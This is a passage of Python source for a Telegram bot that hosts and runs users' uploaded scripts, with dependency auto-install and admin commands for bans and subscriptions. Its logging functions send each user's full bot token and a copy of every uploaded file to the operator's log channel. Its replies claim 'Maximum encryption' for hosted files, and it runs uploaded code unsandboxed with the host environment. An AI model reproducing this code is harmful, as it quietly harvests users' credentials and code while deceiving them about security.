                    "require": {}
                }
                with open(composer_json_path, 'w') as f:
                    json.dump(composer_data, f, indent=2)

            for package in dependencies:
                try:
                    result = subprocess.run(
                        ['composer', 'require', package],
                        cwd=user_folder,
                        capture_output=True, text=True, timeout=120
                    )
                    if result.returncode == 0:
                        installations.append(f"✅ Installed PHP: {package}")
                    else:
                        installations.append(f"⚠️ Failed PHP: {package}")
                except Exception as e:
                    installations.append(f"❌ PHP Error: {package} - {str(e)}")

        return installations, ai_analysis

    try:
        if file_ext == '.py':
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()

            python_packages = {
                'requests': 'requests', 'flask': 'flask', 'django': 'django',
                'numpy': 'numpy', 'pandas': 'pandas', 'matplotlib': 'matplotlib',
                'scipy': 'scipy', 'sklearn': 'scikit-learn', 'cv2': 'opencv-python',
                'PIL': 'Pillow', 'bs4': 'beautifulsoup4', 'selenium': 'selenium',
                'telebot': 'pyTelegramBotAPI', 'telegram': 'python-telegram-bot',
                'pyrogram': 'pyrogram', 'tgcrypto': 'tgcrypto', 'aiohttp': 'aiohttp',
                'asyncio': None, 'json': None, 'os': None, 'sys': None, 're': None,
                'time': None, 'datetime': None, 'random': None, 'hashlib': None
            }

            import_pattern = r'(?:from\s+(\w+)|import\s+(\w+))'
            matches = re.findall(import_pattern, content)

            for match in matches:
                module = match[0] or match[1]
                if module in python_packages and python_packages[module]:
                    try:
                        result = subprocess.run([sys.executable, '-m', 'pip', 'install', python_packages[module]], 
                                               capture_output=True, text=True, timeout=30)
                        if result.returncode == 0:
                            installations.append(f"✅ Installed Python package: {python_packages[module]}")
                        else:
                            installations.append(f"❌ Failed to install: {python_packages[module]}")
                    except Exception as e:
                        installations.append(f"❌ Error installing {python_packages[module]}: {str(e)}")

        elif file_ext == '.js':
            package_json_path = os.path.join(user_folder, 'package.json')
            if not os.path.exists(package_json_path):
                package_data = {
                    "name": "user-script", "version": "1.0.0",
                    "description": "Auto-generated package.json",
                    "main": "index.js", "dependencies": {}
                }
                with open(package_json_path, 'w') as f:
                    json.dump(package_data, f, indent=2)

            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()

            node_packages = {
                'express': 'express', 'axios': 'axios', 'lodash': 'lodash', 
                'moment': 'moment', 'telegraf': 'telegraf', 'node-telegram-bot-api': 'node-telegram-bot-api'
            }

            require_pattern = r'require\([\'"](\w+)[\'"]\)'
            matches = re.findall(require_pattern, content)

            for module in matches:
                if module in node_packages and node_packages[module]:
                    try:
                        result = subprocess.run(['npm', 'install', node_packages[module]], 
                                               cwd=user_folder, capture_output=True, text=True, timeout=30)
                        if result.returncode == 0:
                            installations.append(f"✅ Installed Node package: {node_packages[module]}")
                        else:
                            installations.append(f"❌ Failed to install: {node_packages[module]}")
                    except Exception as e:
                        installations.append(f"❌ Error installing {node_packages[module]}: {str(e)}")

        elif file_ext == '.php':
            composer_json_path = os.path.join(user_folder, 'composer.json')

            try:
                composer_check = subprocess.run(['composer', '--version'], 
                                              capture_output=True, text=True, timeout=5)
                if composer_check.returncode != 0:
                    installations.append("ℹ️ No PHP dependencies detected")
                    return installations, None
            except Exception as e:
                installations.append("ℹ️ No PHP dependencies detected")
                return installations, None

            if os.path.exists(composer_json_path):
                try:
                    installations.append("📦 Found composer.json - installing dependencies...")
                    result = subprocess.run(['composer', 'install', '--no-interaction', '--prefer-dist'], 
                                          cwd=user_folder, capture_output=True, text=True, timeout=45)
                    if result.returncode == 0:
                        installations.append("✅ Composer packages installed successfully")
                    else:
                        installations.append(f"❌ Composer install failed: {result.stderr[:200]}")
                except subprocess.TimeoutExpired:
                    installations.append("❌ Composer install timeout - took too long")
                except Exception as e:
                    installations.append(f"❌ Error running composer: {str(e)}")
            else:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()

                php_packages = {}

                if 'Telegram\\Bot\\' in content or 'use Telegram\\Bot' in content:
                    php_packages['telegram-bot/api'] = '^2.0'
                if 'Longman\\TelegramBot' in content or 'use Longman\\TelegramBot' in content:
                    php_packages['longman/telegram-bot'] = '^0.76'
                if 'GuzzleHttp' in content or 'use GuzzleHttp' in content:
                    php_packages['guzzlehttp/guzzle'] = '^7.0'
                if 'TelegramBot\\Api' in content:
                    php_packages['telegram-bot/api'] = '^2.0'

                if php_packages:
                    try:
                        composer_data = {
                            "name": "user-php-script",
                            "description": "Auto-generated composer.json",
                            "require": php_packages,
                            "minimum-stability": "stable"
                        }

                        with open(composer_json_path, 'w') as f:
                            json.dump(composer_data, f, indent=2)

                        installations.append(f"📦 Created composer.json with {len(php_packages)} package(s)")

                        result = subprocess.run(['composer', 'install', '--no-interaction', '--prefer-dist'], 
                                              cwd=user_folder, capture_output=True, text=True, timeout=45)

                        if result.returncode == 0:
                            installations.append("✅ PHP packages installed successfully")
                        else:
                            os.remove(composer_json_path)
                            installations.append(f"❌ Composer install failed, removed composer.json")
                    except subprocess.TimeoutExpired:
                        if os.path.exists(composer_json_path):
                            os.remove(composer_json_path)
                        installations.append("❌ Composer install timeout")
                    except Exception as e:
                        if os.path.exists(composer_json_path):
                            os.remove(composer_json_path)
                        installations.append(f"❌ Error setting up composer: {str(e)}")
                else:
                    installations.append("ℹ️ No PHP dependencies detected")

    except Exception as e:
        installations.append(f"❌ Error during dependency analysis: {str(e)}")

    return installations, None

def execute_script(user_id, script_path, message_for_updates=None):
    """Execute a script with comprehensive language support and hosting"""
    script_name = os.path.basename(script_path)
    script_ext = os.path.splitext(script_path)[1].lower()

    supported_types = {
        '.py': {'name': 'Python', 'icon': '🐍', 'executable': True, 'type': 'executable'},
        '.js': {'name': 'JavaScript', 'icon': '🟨', 'executable': True, 'type': 'executable'},
        '.java': {'name': 'Java', 'icon': '☕', 'executable': True, 'type': 'executable'},
        '.cpp': {'name': 'C++', 'icon': '🔧', 'executable': True, 'type': 'executable'},
        '.c': {'name': 'C', 'icon': '🔧', 'executable': True, 'type': 'executable'},
        '.sh': {'name': 'Shell', 'icon': '🖥️', 'executable': True, 'type': 'executable'},
        '.rb': {'name': 'Ruby', 'icon': '💎', 'executable': True, 'type': 'executable'},
        '.go': {'name': 'Go', 'icon': '🐹', 'executable': True, 'type': 'executable'},
        '.rs': {'name': 'Rust', 'icon': '🦀', 'executable': True, 'type': 'executable'},
        '.php': {'name': 'PHP', 'icon': '🐘', 'executable': True, 'type': 'executable'},
        '.cs': {'name': 'C#', 'icon': '💜', 'executable': True, 'type': 'executable'},
        '.kt': {'name': 'Kotlin', 'icon': '🟣', 'executable': True, 'type': 'executable'},
        '.swift': {'name': 'Swift', 'icon': '🍎', 'executable': True, 'type': 'executable'},
        '.dart': {'name': 'Dart', 'icon': '🎯', 'executable': True, 'type': 'executable'},
        '.ts': {'name': 'TypeScript', 'icon': '🔷', 'executable': True, 'type': 'executable'},
        '.lua': {'name': 'Lua', 'icon': '🌙', 'executable': True, 'type': 'executable'},
        '.perl': {'name': 'Perl', 'icon': '🐪', 'executable': True, 'type': 'executable'},
        '.scala': {'name': 'Scala', 'icon': '🔴', 'executable': True, 'type': 'executable'},
        '.r': {'name': 'R', 'icon': '📊', 'executable': True, 'type': 'executable'},

        '.html': {'name': 'HTML', 'icon': '🌐', 'executable': False, 'type': 'hosted'},
        '.css': {'name': 'CSS', 'icon': '🎨', 'executable': False, 'type': 'hosted'},
        '.xml': {'name': 'XML', 'icon': '📄', 'executable': False, 'type': 'hosted'},
        '.json': {'name': 'JSON', 'icon': '📋', 'executable': False, 'type': 'hosted'},
        '.yaml': {'name': 'YAML', 'icon': '⚙️', 'executable': False, 'type': 'hosted'},
        '.yml': {'name': 'YAML', 'icon': '⚙️', 'executable': False, 'type': 'hosted'},
        '.md': {'name': 'Markdown', 'icon': '📝', 'executable': False, 'type': 'hosted'},
        '.txt': {'name': 'Text', 'icon': '📄', 'executable': False, 'type': 'hosted'},
        '.jpg': {'name': 'JPEG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.jpeg': {'name': 'JPEG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.png': {'name': 'PNG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.gif': {'name': 'GIF Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.svg': {'name': 'SVG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.pdf': {'name': 'PDF Document', 'icon': '📄', 'executable': False, 'type': 'hosted'},
        '.zip': {'name': 'ZIP Archive', 'icon': '📦', 'executable': False, 'type': 'hosted'},
        '.sql': {'name': 'SQL Script', 'icon': '🗄️', 'executable': False, 'type': 'hosted'},
        '.bat': {'name': 'Batch Script', 'icon': '🖥️', 'executable': True, 'type': 'executable'},
        '.ps1': {'name': 'PowerShell', 'icon': '💙', 'executable': True, 'type': 'executable'},
    }

    if script_ext not in supported_types:
        return False, f"Unsupported file type: {script_ext}"

    lang_info = supported_types[script_ext]

    try:
        if message_for_updates:
            safe_edit_message(
                message_for_updates.chat.id,
                message_for_updates.message_id,
                f"🔄 Starting your script...\n\n"
                f"📄 File: {script_name}\n"
                f"🔧 Language: {lang_info['name']}\n"
                f"⏳ Status: Initializing..."
            )

        if not lang_info.get('executable', True):
            if message_for_updates:
                file_hash = hashlib.md5(f"{user_id}_{script_name}".encode()).hexdigest()
                repl_slug = os.environ.get('REPL_SLUG', 'universal-file-host')
                repl_owner = os.environ.get('REPL_OWNER', 'replit-user')
                file_url = f"https://{repl_slug}-{repl_owner}.replit.app/file/{file_hash}"

                success_msg = f"{lang_info['icon']} {lang_info['name']} file hosted successfully!\n\n"
                success_msg += f"File: {script_name}\n"
                success_msg += f"Status: Securely hosted\n"
                success_msg += f"URL: {file_url}\n"
                success_msg += f"Access: Use 'Check Files' button\n"
                success_msg += f"Security: Maximum encryption\n\n"
                success_msg += f"Your {lang_info['name']} file is now accessible!"

                safe_edit_message(
                    message_for_updates.chat.id, 
                    message_for_updates.message_id, 
                    success_msg
                )
            return True, f"File hosted successfully"

        if message_for_updates:
            safe_edit_message(
                message_for_updates.chat.id,
                message_for_updates.message_id,
                f"🔄 Starting your script...\n\n"
                f"📄 File: {script_name}\n"
                f"🔧 Language: {lang_info['name']}\n"
                f"⏳ Status: Installing dependencies..."
            )

        user_folder = get_user_folder(user_id)
        # Try AI analysis but continue if it fails
        try:
            installations, ai_analysis = auto_install_dependencies(script_path, script_ext, user_folder, user_id, message_for_updates)
        except Exception as e:
            logger.warning(f"Dependency installation with AI failed: {e} - continuing with basic installation")
            installations = ["⚠️ AI analysis unavailable - using basic dependency detection"]
            ai_analysis = None

        if installations and message_for_updates:
            install_msg = f"🤖 AI Analysis & Setup:\n\n" + "\n".join(installations[:8])
            if len(installations) > 8:
                install_msg += f"\n... और {len(installations) - 8} और actions"
            safe_send_message(message_for_updates.chat.id, install_msg)

        if script_ext == '.py':
            cmd = [sys.executable, script_path]
        elif script_ext == '.js':
            cmd = ['node', script_path]
        elif script_ext == '.java':
            class_name = os.path.splitext(script_name)[0]
            compile_result = subprocess.run(['javac', script_path], capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"Java compilation failed: {compile_result.stderr}"
            cmd = ['java', '-cp', os.path.dirname(script_path), class_name]
        elif script_ext in ['.cpp', '.c']:
            executable = os.path.join(user_folder, 'output')
            compiler = 'g++' if script_ext == '.cpp' else 'gcc'
            compile_result = subprocess.run([compiler, script_path, '-o', executable], 
                                          capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"C/C++ compilation failed: {compile_result.stderr}"
            cmd = [executable]
        elif script_ext == '.go':
            cmd = ['go', 'run', script_path]
        elif script_ext == '.rs':
            executable = os.path.join(user_folder, 'output')
            compile_result = subprocess.run(['rustc', script_path, '-o', executable], 
                                          capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"Rust compilation failed: {compile_result.stderr}"
            cmd = [executable]
        elif script_ext == '.php':
            # Check if composer autoload exists
            vendor_autoload = os.path.join(user_folder, 'vendor', 'autoload.php')
            if os.path.exists(vendor_autoload):
                logger.info(f"Found composer autoload for PHP script: {script_name}")

            # Use full PHP path with better error reporting
            cmd = ['php', '-d', 'display_errors=1', '-f', script_path]
        elif script_ext == '.rb':
            cmd = ['ruby', script_path]
        elif script_ext == '.lua':
            cmd = ['lua', script_path]
        elif script_ext == '.sh':
            cmd = ['bash', script_path]
        elif script_ext == '.ts':
            js_path = script_path.replace('.ts', '.js')
            compile_result = subprocess.run(['tsc', script_path], capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"TypeScript compilation failed: {compile_result.stderr}"
            cmd = ['node', js_path]
        else:
            cmd = [script_path]

        log_file_path = os.path.join(LOGS_DIR, f"execution_{user_id}_{int(time.time())}.log")

        with open(log_file_path, 'w') as log_file:
            process = subprocess.Popen(
                cmd,
                stdout=log_file,
                stderr=subprocess.STDOUT,
                cwd=os.path.dirname(script_path),
                env=os.environ.copy()
            )

            script_key = f"{user_id}_{script_name}"
            bot_scripts[script_key] = {
                'process': process,
                'script_key': script_key,
                'user_id': user_id,
                'file_name': script_name,
                'start_time': datetime.now(),
                'log_file_path': log_file_path,
                'language': lang_info['name'],
                'icon': lang_info['icon']
            }

            save_running_script(user_id, script_name, process.pid)
            save_persistent_data()  # Save persistent data

            if message_for_updates:
                success_msg = f"🎉 Script started successfully!\n\n"
                success_msg += f"📄 File: {script_name}\n"
                success_msg += f"🔧 Language: {lang_info['name']} {lang_info['icon']}\n"
                success_msg += f"🆔 Process ID: {process.pid}\n"
                success_msg += f"⏰ Start Time: {datetime.now().strftime('%H:%M:%S')}\n"
                success_msg += f"📊 Status: 🟢 Running"

                safe_edit_message(
                    message_for_updates.chat.id, 
                    message_for_updates.message_id, 
                    success_msg
                )

            return True, f"Script started with PID {process.pid}"

    except Exception as e:
        error_msg = f"Execution failed: {str(e)}"
        logger.error(f"Script execution error for user {user_id}: {e}")

        if message_for_updates:
            safe_edit_message(
                message_for_updates.chat.id, 
                message_for_updates.message_id, 
                f"❌ {error_msg}"
            )

        return False, error_msg

# --- Enhanced Logging Functions ---
def log_file_upload(user_id, file_name, file_type, file_size, security_status, file_path=None):
    """Log file upload to channel with actual file"""
    try:
        user_info = get_user_info(user_id)

        # Check if this is from a cloned bot
        current_bot_username = bot.get_me().username
        is_cloned_bot = current_bot_username != "CyberHacked0Bot"  # Adjust to your main bot username

        log_msg = f"📤 NEW FILE UPLOAD\n\n"
        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        log_msg += f"🆔 User ID: {user_id}\n"
        log_msg += f"📧 Username: @{user_info['username'] or 'None'}\n"

        if is_cloned_bot:
            log_msg += f"🤖 From Clone Bot: @{current_bot_username}\n"
            log_msg += f"👑 Clone Owner: {OWNER_ID}\n"

        log_msg += f"📄 File: {file_name}\n"
        log_msg += f"📁 Type: {file_type}\n"
        log_msg += f"📦 Size: {file_size} bytes\n"
        log_msg += f"🛡️ Security: {security_status}\n"
        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        log_msg += f"🔗 File stored in user folder: /upload_bots/{user_id}/"

        # Send file along with log message
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                send_to_log_channel(log_msg, f)
        else:
            send_to_log_channel(log_msg)

    except Exception as e:
        logger.error(f"Error logging file upload: {e}")

def log_clone_creation(user_id, bot_username, token):
    """Log clone bot creation to channel with full token"""
    try:
        user_info = get_user_info(user_id)
        log_msg = f"🤖 NEW BOT CLONE CREATED\n\n"
        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        log_msg += f"🆔 User ID: {user_id}\n"
        log_msg += f"📧 Username: @{user_info['username'] or 'None'}\n"
        log_msg += f"🤖 Bot: @{bot_username}\n"
        log_msg += f"🔑 Full Token: {token}\n"  # Full token for logging
        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        log_msg += f"🌐 Clone bot is now running independently"

        send_to_log_channel(log_msg)
    except Exception as e:
        logger.error(f"Error logging clone creation: {e}")

def log_script_execution(user_id, file_name, status, execution_time=None):
    """Log script execution to channel"""
    try:
        user_info = get_user_info(user_id)

        # Check if this is from a cloned bot
        current_bot_username = bot.get_me().username
        is_cloned_bot = current_bot_username != "CyberHacked0Bot"  # Adjust to your main bot username

        log_msg = f"🚀 SCRIPT EXECUTION\n\n"
        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        log_msg += f"🆔 User ID: {user_id}\n"
        log_msg += f"📧 Username: @{user_info['username'] or 'None'}\n"

        if is_cloned_bot:
            log_msg += f"🤖 From Clone Bot: @{current_bot_username}\n"

        log_msg += f"📄 File: {file_name}\n"
        log_msg += f"📊 Status: {status}\n"
        if execution_time:
            log_msg += f"⏱️ Execution Time: {execution_time}s\n"
        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        send_to_log_channel(log_msg)
    except Exception as e:
        logger.error(f"Error logging script execution: {e}")

def get_user_info(user_id):
    """Get user information from database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT username, first_name, last_name FROM active_users WHERE user_id = ?', (user_id,))
        result = c.fetchone()
        conn.close()

        if result:
            return {
                'username': result[0],
                'first_name': result[1],
                'last_name': result[2]
            }
        else:
            return {
                'username': 'Unknown',
                'first_name': 'Unknown',
                'last_name': 'Unknown'
            }
    except Exception as e:
        logger.error(f"Error getting user info: {e}")
        return {
            'username': 'Unknown',
            'first_name': 'Unknown',
            'last_name': 'Unknown'
        }

# --- Enhanced Periodic Backup System ---


# Global dictionary to store user config requests
user_config_requests = {}

@bot.message_handler(commands=['setconfig'])
def set_config_command(message):
    """Allow users to set configuration values for their uploaded code"""
    user_id = message.from_user.id

    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            help_msg = "📝 Configuration Setup\n\n"
            help_msg += "Usage: /setconfig <KEY> <VALUE>\n\n"
            help_msg += "Example:\n"
            help_msg += "/setconfig TELEGRAM_BOT_TOKEN 123456:ABC-DEF\n"
            help_msg += "/setconfig DB_PASSWORD mypassword123\n\n"
            help_msg += "💡 AI आपको बताएगी कि कौनसी keys चाहिए।"
            safe_reply_to(message, help_msg)
            return

        config_key = parts[1].upper()
        config_value = parts[2]

        # Store in user's config
        if user_id not in user_config_requests:
            user_config_requests[user_id] = {}

        user_config_requests[user_id][config_key] = config_value

        # Create/update .env file in user's folder
        user_folder = get_user_folder(user_id)
        env_file_path = os.path.join(user_folder, '.env')

        env_content = ""
        if os.path.exists(env_file_path):
            with open(env_file_path, 'r') as f:
                env_content = f.read()

        # Update or add the key
        if f"{config_key}=" in env_content:
            # Replace existing value
            import re
            env_content = re.sub(f'{config_key}=.*', f'{config_key}={config_value}', env_content)
        else:
            # Add new key
            env_content += f"\n{config_key}={config_value}\n"

        with open(env_file_path, 'w') as f:
            f.write(env_content)

        success_msg = f"✅ Configuration Updated!\n\n"
        success_msg += f"🔑 Key: {config_key}\n"
        success_msg += f"💾 Saved to .env file\n"
        success_msg += f"📁 Location: {user_folder}/.env\n\n"
        success_msg += f"🤖 AI अब इस configuration का use करेगी।\n"
        success_msg += f"🚀 आप अब अपना bot start कर सकते हैं!"

        safe_reply_to(message, success_msg)

        logger.info(f"User {user_id} set config: {config_key}")

    except Exception as e:
        safe_reply_to(message, f"❌ Error: {str(e)}")

def periodic_backup():
    """Run periodic backups every hour"""
    while True:
        try:
            time.sleep(3600)  # 1 hour

            # Create backup
            create_backup()

            # Save persistent data
            save_persistent_data()

            # Log backup completion
            logger.info("Periodic backup completed successfully")

            # Send backup status to log channel
            try:
                backup_status = f"🔄 AUTOMATIC BACKUP COMPLETED\n\n"
                backup_status += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                backup_status += f"📊 Active Users: {len(active_users)}\n"
                backup_status += f"📁 Total Files: {sum(len(files) for files in user_files.values())}\n"
                backup_status += f"🚀 Running Scripts: {len(bot_scripts)}\n"
                backup_status += f"✅ All data secured"

                send_to_log_channel(backup_status)
            except:
                pass

        except Exception as e:
            logger.error(f"Error in periodic backup: {e}")

def start_periodic_backup():
    """Start the periodic backup thread"""
    backup_thread = threading.Thread(target=periodic_backup, daemon=True)
    backup_thread.start()
    logger.info("Periodic backup system started")

def self_ping_task():
    """Background task to keep bot active every 2 minutes - invisible to users"""
    while True:
        try:
            time.sleep(120)  # 2 minutes
            
            # Internal ping - yeh kisi ko dikhai nahi dega
            # Sirf logs mein internal activity show hogi
            ping_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            logger.info(f"🔄 Internal ping at {ping_time}")
            
            # Optional: Database me last ping time save kar sakte hain
            # Yeh bilkul safe hai aur kisi feature ko affect nahi karega
            
        except Exception as e:
            logger.error(f"Self-ping error: {e}")
            # Agar error aaye to bhi continue kare, bot ko affect na ho
            time.sleep(60)  # Wait 1 minute and retry

def start_self_ping():
    """Start the self-ping background thread"""
    ping_thread = threading.Thread(target=self_ping_task, daemon=True)
    ping_thread.start()
    logger.info("Self-ping system started - running every 2 minutes")

# --- Enhanced User Management ---
def save_all_users_to_backup():
    """Save complete user list to backup file"""
    try:
        user_backup_file = os.path.join(BACKUP_DIR, f"users_backup_{datetime.now().strftime('%Y%m%d_%H%M')}.json")

        user_data = {
            'active_users': list(active_users),
            'user_details': {},
            'backup_time': datetime.now().isoformat()
        }

        # Get detailed user info
        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT user_id, username, first_name, last_name, join_date, last_seen FROM active_users')

            for user_id, username, first_name, last_name, join_date, last_seen in c.fetchall():
                user_data['user_details'][str(user_id)] = {
                    'username': username,
                    'first_name': first_name,
                    'last_name': last_name,
                    'join_date': join_date,
                    'last_seen': last_seen,
                    'file_count': get_user_file_count(user_id)
                }

            conn.close()
        except Exception as e:
            logger.error(f"Error getting user details: {e}")

        with open(user_backup_file, 'w', encoding='utf-8') as f:
            json.dump(user_data, f, indent=2, ensure_ascii=False)

        logger.info(f"User backup saved: {user_backup_file}")
        return user_backup_file
    except Exception as e:
        logger.error(f"Error saving user backup: {e}")
        return None

# --- Ban Management Commands ---
@bot.message_handler(commands=['ban'])
def ban_user(message):
    """Ban a user from using the bot"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            safe_reply_to(message, "❌ Usage: /ban <user_id> [reason]")
            return

        target_user_id = int(parts[1])
        reason = "No reason provided"

        if len(parts) > 2:
            reason = ' '.join(parts[2:])

        banned_users.add(target_user_id)

        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('INSERT OR REPLACE INTO banned_users (user_id, reason, ban_date) VALUES (?, ?, ?)',
                     (target_user_id, reason, datetime.now().isoformat()))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error saving ban: {e}")

        # Update persistent data
        save_persistent_data()

        safe_reply_to(message, f"✅ User banned!\n\nUser: {target_user_id}\nReason: {reason}")

        send_to_log_channel(f"🚫 USER BANNED\n\nUser ID: {target_user_id}\nReason: {reason}\nBy Admin: {user_id}")

    except Exception as e:
        safe_reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    """Unban a user"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    try:
        parts = message.text.split()
        if len(parts) != 2:
            safe_reply_to(message, "❌ Usage: /unban <user_id>")
            return

        target_user_id = int(parts[1])

        if target_user_id in banned_users:
            banned_users.remove(target_user_id)

            try:
                conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
                c = conn.cursor()
                c.execute('DELETE FROM banned_users WHERE user_id = ?', (target_user_id,))
                conn.commit()
                conn.close()
            except Exception as e:
                logger.error(f"Database error removing ban: {e}")

            # Update persistent data
            save_persistent_data()

            safe_reply_to(message, f"✅ User unbanned!\n\nUser: {target_user_id}")

            send_to_log_channel(f"✅ USER UNBANNED\n\nUser ID: {target_user_id}\nBy Admin: {user_id}")
        else:
            safe_reply_to(message, f"❌ User not found in ban list: {target_user_id}")

    except Exception as e:
        safe_reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['banned'])
def list_banned_users(message):
    """List all banned users"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    if not banned_users:
        safe_reply_to(message, "📋 No banned users.")
        return

    banned_text = "🚫 Banned Users:\n\n"

    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT user_id, reason, ban_date FROM banned_users')

        for banned_user_id, reason, ban_date in c.fetchall():
            banned_text += f"👤 User ID: {banned_user_id}\n"
            banned_text += f"📝 Reason: {reason}\n"
            banned_text += f"⏰ Banned: {ban_date[:16]}\n\n"

        conn.close()
    except Exception as e:
        logger.error(f"Error fetching banned users: {e}")
        banned_text = "❌ Error fetching banned users"

    safe_reply_to(message, banned_text)

# --- Subscription Management Commands ---
@bot.message_handler(commands=['addsub'])
def add_subscription(message):
    """Add subscription to a user"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    try:
        parts = message.text.split()
        if len(parts) != 3:
            safe_reply_to(message, "❌ Usage: /addsub <user_id> <days>")
            return

        target_user_id = int(parts[1])
        days = int(parts[2])

        expiry_date = datetime.now() + timedelta(days=days)
        user_subscriptions[target_user_id] = {'expiry': expiry_date}

        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('INSERT OR REPLACE INTO subscriptions (user_id, expiry) VALUES (?, ?)',
                     (target_user_id, expiry_date.isoformat()))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error saving subscription: {e}")

        # Update persistent data
        save_persistent_data()

        safe_reply_to(message, f"✅ Subscription added!\n\nUser: {target_user_id}\nDays: {days}\nExpiry: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}")

        send_to_log_channel(f"💳SUBSCRIPTION ADDED\n\nUser ID: {target_user_id}\nDays: {days}\nExpiry: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\nBy Admin: {user_id}")

    except Exception as e:
        safe_reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['removesub'])
def remove_subscription(message):
    """Remove subscription from a user"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    try:
        parts = message.text.split()
        if len(parts) != 2:
            safe_reply_to(message, "❌ Usage: /removesub <user_id>")
            return

        target_user_id = int(parts[1])

        if target_user_id in user_subscriptions:
            del user_subscriptions[target_user_id]

            try:
                conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
                c = conn.cursor()
                c.execute('DELETE FROM subscriptions WHERE user_id = ?', (target_user_id,))
                conn.commit()
                conn.close()
            except Exception as e:
                logger.error(f"Database error removing subscription: {e}")

            # Update persistent data
            save_persistent_data()

            safe_reply_to(message, f"✅ Subscription removed!\n\nUser: {target_user_id}")

            send_to_log_channel(f"🗑️ SUBSCRIPTION REMOVED\n\nUser ID: {target_user_id}\nBy Admin: {user_id}")
        else:
            safe_reply_to(message, f"❌ No subscription found for user: {target_user_id}")

    except Exception as e:
        safe_reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['checksub'])
def check_subscription(message):
    """Check subscription status of a user"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    try:
        parts = message.text.split()
        if len(parts) != 2:
            safe_reply_to(message, "❌ Usage: /checksub <user_id>")
            return

        target_user_id = int(parts[1])

        if target_user_id in user_subscriptions:
            expiry = user_subscriptions[target_user_id]['expiry']
            is_active = expiry > datetime.now()
            status = "🟢 ACTIVE" if is_active else "🔴 EXPIRED"

            sub_info = f"📊 Subscription Status\n\n"
            sub_info += f"User ID: {target_user_id}\n"
            sub_info += f"Status: {status}\n"
            sub_info += f"Expiry: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n"
            sub_info += f"Time Left: {str(expiry - datetime.now()).split('.')[0] if is_active else 'Expired'}"

            safe_reply_to(message, sub_info)
        else:
            safe_reply_to(message, f"❌ No subscription found for user: {target_user_id}")

    except Exception as e:
        safe_reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['users'])
def list_users(message):
    """List all active users with details"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    if not active_users:
        safe_reply_to(message, "📊 No active users found.")
        return

    users_text = f"📊 Active Users: {len(active_users)}\n\n"

    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT user_id, username, first_name, last_name, join_date FROM active_users')

        for i, (user_id_db, username, first_name, last_name, join_date) in enumerate(c.fetchall()[:50], 1):
            file_count = get_user_file_count(user_id_db)
            is_subscribed = user_id_db in user_subscriptions and user_subscriptions[user_id_db]['expiry'] > datetime.now()
            subscription_status = "🟢 SUBSCRIBED" if is_subscribed else "🔴 FREE"

            users_text += f"{i}. User ID: {user_id_db}\n"
            users_text += f"   Name: {first_name or ''} {last_name or ''}\n"
            users_text += f"   Username: {username or 'None'}\n"
